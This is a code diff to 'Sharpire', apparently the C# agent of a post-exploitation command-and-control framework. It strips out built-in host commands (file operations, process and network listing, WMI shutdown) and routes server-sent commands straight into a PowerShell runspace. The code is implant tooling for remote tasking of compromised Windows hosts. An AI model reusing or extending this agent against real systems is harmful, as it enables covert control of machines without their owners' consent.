@@ -3,12 +3,8 @@ using System.Collections.Generic;
 using System.Collections.ObjectModel;
 using System.IO;
 using System.Linq;
-using System.Management;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
-using System.Net;
-using System.Runtime.InteropServices;
-using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Text.RegularExpressions;
@@ -17,9 +13,6 @@ namespace Sharpire
 {
     class Agent
     {
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool IsWow64Process([In] IntPtr process, [Out] out bool wow64Process);
-
         private byte[] packets;
         
         public SessionInfo sessionInfo;
@@ -196,371 +189,31 @@ namespace Sharpire
             }
         }
         
-        internal static string InvokeShellCommand(string command, string arguments)
+        internal static string InvokeShellCommand(string command)
         {
-            if (arguments.Contains("*\"\\\\*"))
+            if (string.IsNullOrEmpty(command))
             {
-                arguments = arguments.Replace("\"\\\\","FileSystem::\"\\\\");
+                return "no shell command supplied";
             }
-            else if (arguments.Contains("*\\\\*")) 
+            // Strip the legacy "shell " prefix the server still ships for back-compat
+            // with deployed agents.
+            if (command.StartsWith("shell ", StringComparison.OrdinalIgnoreCase))
             {
-                arguments = arguments.Replace("\\\\", "FileSystem::\\");
+                command = command.Substring(6);
             }
-            string output = "";
-            //This is mostly dead code consider removing in the future
-            if (command.ToLower() == "shell")
-            {
-                if (command.Length > 0)
-                {
-                    output = RunPowerShell(arguments);
-                }
-                else
-                {
-                    output = "no shell command supplied";
-                }
-                output += "\n\r";
-            }
-            else
-            {
-                if (command == "ls" || command == "dir" || command == "gci")
-                {
-                    output = GetChildItem(arguments);
-                }
-                else if (command == "mv" || command == "move")
-                {
-                    string[] parts = arguments.Split(' ');
-                    if (2 != parts.Length)
-                        return "Invalid mv|move command";
-                    MoveFile(parts.FirstOrDefault(), parts.LastOrDefault());
-                    output = "[+] Executed " + command + " " + arguments;
-                }
-                else if (command == "cp" || command == "copy")
-                {
-                    string[] parts = arguments.Split(' ');
-                    if (2 != parts.Length)
-                        return "Invalid cp|copy command";
-                    CopyFile(parts.FirstOrDefault(), parts.LastOrDefault());
-                    output = "[+] Executed " + command + " " + arguments;
-                }
-                else if (command == "rm" || command == "del" || command == "rmdir")
-                {
-                    DeleteFile(arguments);
-                    output = "[+] Executed " + command + " " + arguments;
-                }
-                else if (command == "cd")
-                {
-                    Directory.SetCurrentDirectory(arguments);
-                }
-                else if (command == "ifconfig" || command == "ipconfig")
-                {
-                    output = Ifconfig();
-                }
-                else if (command == "ps" || command == "tasklist")
-                {
-                    output = Tasklist(arguments);
-                }
-                else if (command == "route")
-                {
-                    output = Route(arguments);
-                }
-                else if (command == "whoami" || command == "getuid")
-                {
-                    output = WindowsIdentity.GetCurrent().Name;
-                }
-                else if (command == "hostname")
-                {
-                    output = Dns.GetHostName();
-                }
-                else if (command == "reboot" || command == "restart")
-                {
-                    Shutdown("2");
-                }
-                else if (command == "shutdown")
-                {
-                    Shutdown("5");
-                }
-                else
-                {
-                    output = RunPowerShell(command + " " + arguments);
-                }
-            }
-            return output;
+            return RunPowerShell(command);
         }
-        
-        private static void Shutdown(string flags)
+
+        internal static string ChangeDirectory(string path)
         {
-            ManagementClass managementClass = new ManagementClass("Win32_OperatingSystem");
-            managementClass.Get();
-
-            managementClass.Scope.Options.EnablePrivileges = true;
-            ManagementBaseObject managementBaseObject = managementClass.GetMethodParameters("Win32Shutdown");
-
-            managementBaseObject["Flags"] = flags;
-            managementBaseObject["Reserved"] = "0";
-            foreach (ManagementObject managementObject in managementClass.GetInstances())
+            if (string.IsNullOrEmpty(path))
             {
-                managementObject.InvokeMethod("Win32Shutdown", managementBaseObject, null);
+                throw new ArgumentException("no path supplied");
             }
+            Directory.SetCurrentDirectory(path);
+            return Directory.GetCurrentDirectory();
         }
-        
-        private static string Route(string arguments)
-        {
-            Dictionary<uint, string> adapters = new Dictionary<uint, string>();
-            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
-            scope.Connect();
-            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
-            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
-            ManagementObjectCollection objectCollection = objectSearcher.Get();
-            foreach (ManagementObject managementObject in objectCollection)
-            {
-                adapters[(uint)managementObject["InterfaceIndex"]] = ManagementObjectToString((string[])managementObject["IPAddress"]);
-            }
 
-            List<string> lines = new List<string>();
-            ObjectQuery query2 = new ObjectQuery("SELECT * FROM Win32_IP4RouteTable ");
-            ManagementObjectSearcher objectSearcher2 = new ManagementObjectSearcher(scope, query2);
-            ManagementObjectCollection objectCollection2 = objectSearcher2.Get();
-            foreach (ManagementObject managementObject in objectCollection2)
-            {
-                string destination = "";
-                if (managementObject["Destination"] != null)
-                {
-                    destination = (string)managementObject["Destination"];
-                }
-
-                string netmask = "";
-                if (managementObject["Mask"] != null)
-                {
-                    netmask = (string)managementObject["Mask"];
-                }
-
-                string nextHop = "0.0.0.0";
-                if ((string)managementObject["NextHop"] != "0.0.0.0")
-                {
-                    nextHop = (string)managementObject["NextHop"];
-                }
-
-                int index = (int)managementObject["InterfaceIndex"];
-
-                string adapter = "";
-                if (!adapters.TryGetValue((uint)index, out adapter))
-                {
-                    adapter = "127.0.0.1";
-                }
-
-                string metric = Convert.ToString((int)managementObject["Metric1"]);
-
-                lines.Add(
-                    string.Format("{0,-17} : {1,-50}\n", "Destination", destination) +
-                    string.Format("{0,-17} : {1,-50}\n", "Netmask", netmask) +
-                    string.Format("{0,-17} : {1,-50}\n", "NextHop", nextHop) +
-                    string.Format("{0,-17} : {1,-50}\n", "Interface", adapter) +
-                    string.Format("{0,-17} : {1,-50}\n", "Metric", metric)    
-                );
-
-            }
-            return string.Join("\n", lines.ToArray());
-        }
-        
-        private static string Tasklist(string arguments)
-        {
-            Dictionary<int, string> owners = new Dictionary<int, string>();
-            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
-            scope.Connect();
-            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
-            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
-            ManagementObjectCollection objectCollection = objectSearcher.Get();
-            foreach (ManagementObject managementObject in objectCollection)
-            {
-                string name = "";
-                string[] owner = new string[2];
-                managementObject.InvokeMethod("GetOwner", owner);
-                if (owner[0] != null)
-                {
-                    name = owner[1] + "\\" + owner[0];
-                }
-                else
-                {
-                    name = "N/A";
-                }
-                managementObject.InvokeMethod("GetOwner", owner);
-                owners[Convert.ToInt32(managementObject["Handle"])] = name;
-            }
-
-            List<string[]> lines = new List<string[]>();
-            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
-            foreach (System.Diagnostics.Process process in processes)
-            {
-                string architecture;
-                int workingSet;
-                bool isWow64Process;
-                try
-                {
-                    IsWow64Process(process.Handle, out isWow64Process);
-                    if (isWow64Process)
-                    {
-                        architecture = "x64";
-                    }
-                    else
-                    {
-                        architecture = "x86";
-                    }
-                }
-                catch
-                {
-                    architecture = "N/A";
-                }
-                workingSet = (int)(process.WorkingSet64 / 1000000);
-
-                string userName = "";
-                try
-                {
-                    if (!owners.TryGetValue(process.Id, out userName))
-                    {
-                        userName = "False";
-                    }
-                }
-                catch
-                {
-                    userName = "Catch";
-                }
-
-                lines.Add(
-                    new[] {process.ProcessName,
-                        process.Id.ToString(),
-                        architecture,
-                        userName,
-                        Convert.ToString(workingSet)
-                    }
-                );
-
-            }
-
-            string[][] linesArray = lines.ToArray();
-
-            //https://stackoverflow.com/questions/232395/how-do-i-sort-a-two-dimensional-array-in-c
-            Comparer<int> comparer = Comparer<int>.Default;
-            Array.Sort<String[]>(linesArray, (x, y) => comparer.Compare(Convert.ToInt32(x[1]), Convert.ToInt32(y[1])));
-            
-            List<string> sortedLines = new List<string>();
-            string[] headerArray = {"ProcessName", "PID", "Arch", "UserName", "MemUsage"};
-            sortedLines.Add(string.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8}", headerArray));
-            foreach (string[] line in linesArray)
-            {
-                sortedLines.Add(string.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8} M", line));
-            }
-            return string.Join("\n", sortedLines.ToArray());
-        } 
-        
-        private static string Ifconfig()
-        {
-            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
-            scope.Connect();
-            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
-            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
-            ManagementObjectCollection objectCollection = objectSearcher.Get();
-            List<string> lines = new List<string>();
-            foreach (ManagementObject managementObject in objectCollection)
-            {
-                if ((bool)managementObject["IPEnabled"] == true)
-                {
-                    lines.Add(
-                        string.Format("{0,-17} : {1,-50}\n", "Description", managementObject["Description"]) +
-                        string.Format("{0,-17} : {1,-50}\n", "MACAddress", managementObject["MACAddress"]) +
-                        string.Format("{0,-17} : {1,-50}\n", "DHCPEnabled", managementObject["DHCPEnabled"]) +
-                        string.Format("{0,-17} : {1,-50}\n", "IPAddress", ManagementObjectToString((string[])managementObject["IPAddress"])) +
-                        string.Format("{0,-17} : {1,-50}\n", "IPSubnet", ManagementObjectToString((string[])managementObject["IPSubnet"])) +
-                        string.Format("{0,-17} : {1,-50}\n", "DefaultIPGateway", ManagementObjectToString((string[])managementObject["DefaultIPGateway"])) +
-                        string.Format("{0,-17} : {1,-50}\n", "DNSServer", ManagementObjectToString((string[])managementObject["DNSServerSearchOrder"])) +
-                        string.Format("{0,-17} : {1,-50}\n", "DNSHostName", managementObject["DNSHostName"]) +
-                        string.Format("{0,-17} : {1,-50}\n", "DNSSuffix", ManagementObjectToString((string[])managementObject["DNSDomainSuffixSearchOrder"]))
-                    );
-                }
-            }
-            return string.Join("\n", lines.ToArray());
-        }
-        
-        private static void DeleteFile(string sourceFile)
-        {
-            if (IsFile(sourceFile))
-                File.Delete(sourceFile);
-            else
-                Directory.Delete(sourceFile, true);
-        }
-        
-        private static void CopyFile(string sourceFile, string destinationFile)
-        {
-            if (IsFile(sourceFile))
-            {
-                File.Copy(sourceFile, destinationFile);
-            }
-            else
-            {
-                //https://stackoverflow.com/questions/58744/copy-the-entire-contents-of-a-directory-in-c-sharp
-                foreach (string dirPath in Directory.GetDirectories(sourceFile, "*", SearchOption.AllDirectories))
-                {
-                    Directory.CreateDirectory(dirPath.Replace(sourceFile, destinationFile));
-                }
-
-                foreach (string newPath in Directory.GetFiles(sourceFile, "*.*", SearchOption.AllDirectories))
-                {
-                    File.Copy(newPath, newPath.Replace(sourceFile, destinationFile), true);
-                }
-            }
-        }
-        
-        private static void MoveFile(string sourceFile, string destinationFile)
-        {
-            if (IsFile(sourceFile))
-                File.Move(sourceFile, destinationFile);
-            else
-                Directory.Move(sourceFile, destinationFile);
-        }
-        
-        private static bool IsFile(string filePath)
-        {
-            FileAttributes fileAttributes = File.GetAttributes(filePath);
-            return (fileAttributes & FileAttributes.Directory) == FileAttributes.Directory ? false : true;
-        }
-        
-        private static string ManagementObjectToString(string[] managementObject)
-        {
-            string output;
-            if (managementObject != null && managementObject.Length > 0)
-            {
-                output = string.Join(", ", managementObject);
-            }
-            else
-            {
-                output = " ";
-            }
-            return output;
-        }
-        
-        private static string GetChildItem(string folder)
-        {
-            if (folder == "")
-            {
-                folder = ".";
-            }
-
-            try
-            {
-                List<string> lines = new List<string>();
-                DirectoryInfo directoryInfo = new DirectoryInfo(folder);
-                FileInfo[] files = directoryInfo.GetFiles();
-                foreach (FileInfo file in files)
-                {
-                    lines.Add(file.ToString());
-                }
-                return string.Join("\n", lines.ToArray());
-            }
-            catch (Exception error)
-            {
-                return "[!] Error: " + error + " (or cannot be accessed).";
-            }
-        }
-        
         internal static string RunPowerShell(string command)
         {
             using (Runspace runspace = RunspaceFactory.CreateRunspace())
